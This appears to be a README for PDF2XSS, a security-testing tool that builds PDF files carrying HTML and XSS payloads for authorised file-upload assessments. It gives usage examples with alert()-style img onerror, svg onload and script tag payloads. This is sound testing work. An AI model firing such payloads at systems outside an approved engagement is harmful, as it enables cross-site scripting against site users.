PDF2XSS

Generate PDF files containing HTML and XSS test payloads for web application file upload assessments.

Features
Generate PDF test files for upload validation
Embed client-specific identifiers
Add custom messages for reporting and evidence collection
Include common HTML and XSS payloads
Support custom payload injection
Produce repeatable test artefacts for client engagements
Installation

Create a virtual environment:

python3 -m venv venv
source venv/bin/activate

Install dependencies:

pip install -r requirements.txt
Usage

add to 
```
mkdir -p ~/.local/bin
chmod +x ~/nixConfig/modules/nixos/scripts/pdf2xss/main.py
ln -sf ~/nixConfig/modules/nixos/scripts/pdf2xss/main.py ~/.local/bin/pdf2xss
```
Basic usage:

python3 main.py \
    -c "Example Ltd"

Specify an output filename:

python3 main.py \
    -c "Example Ltd" \
    -f example-test.pdf

Add a custom message:

python3 main.py \
    -c "Example Ltd" \
    -m "Stored XSS Validation Test"

Specify all options:

python3 main.py \
    -c "Example Ltd" \
    -f example-xss.pdf \
    -m "Stored XSS Validation Test"

Use a custom payload:

python3 main.py \
    -c "Example Ltd" \
    -m "Stored XSS Validation Test" \
    -p "<img src=x onerror=alert('Example Ltd')>"

SVG payload example:

python3 main.py \
    -c "Example Ltd" \
    -p "<svg onload=alert('Example Ltd')>"

Script payload example:

python3 main.py \
    -c "Example Ltd" \
    -p "<script>alert('Example Ltd')</script>"
Command Line Arguments
Argument	Description
-c, --client	Client name (required)
-f, --file	Output PDF filename
-m, --message	Custom message included in payloads
-p, --payload	Custom payload to embed in the PDF
Example Output

The generated PDF contains:

Assessment cover page
Client identification
HTML injection test payloads
JavaScript payloads
Common XSS payload collection
Assessment reference information
Disclaimer

This tool is intended for authorised security testing activities only. Ensure testing is performed within the scope of an approved assessment and in accordance with the agreed Rules of Engagement.